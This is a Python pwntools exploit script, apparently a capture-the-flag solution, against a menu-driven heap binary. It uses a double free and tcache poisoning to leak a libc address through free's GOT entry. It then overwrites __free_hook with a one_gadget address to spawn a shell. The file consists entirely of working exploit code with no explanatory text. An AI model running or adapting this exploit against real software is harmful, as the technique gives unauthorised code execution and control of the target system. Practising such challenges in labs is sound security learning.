#!/usr/bin/python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b *main+196
        c
        ''')
        input()

def add_admin():
    sla(b'Choice: ', b'1')

def add_user(name):
    sla(b'Choice: ', b'2')
    sa(b'name: ', name)

def print_admin():
    sla(b'Choice: ', b'3')

def edit_user(name):
    sla(b'Choice: ', b'4')
    sa(b'name: ', name)

def print_user():
    sla(b'Choice: ', b'5')

def del_admin():
    sla(b'Choice: ', b'6')

def del_user():
    sla(b'Choice: ', b'7')

if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()
add_user(b'a'*8)
del_user()
del_user()
edit_user(p64(exe.got.free))
add_admin()
add_user(b'A')
print_user()
p.recvuntil(b'Students name is A')
libc_leak = u64(b'\x50' + p.recv(5) + b'\0\0')
log.info(f"libc_leak = {hex(libc_leak)}")
libc.address = libc_leak - 0x97950
log.info(f"libc.address = {hex(libc.address)}")

edit_user(p64(libc_leak))
del_admin()
add_user(b'a')
del_user()
del_user()
edit_user(p64(libc.sym.__free_hook))
add_admin()
add_user(p64(libc.address + 0x4f322))
del_user()

p.interactive()

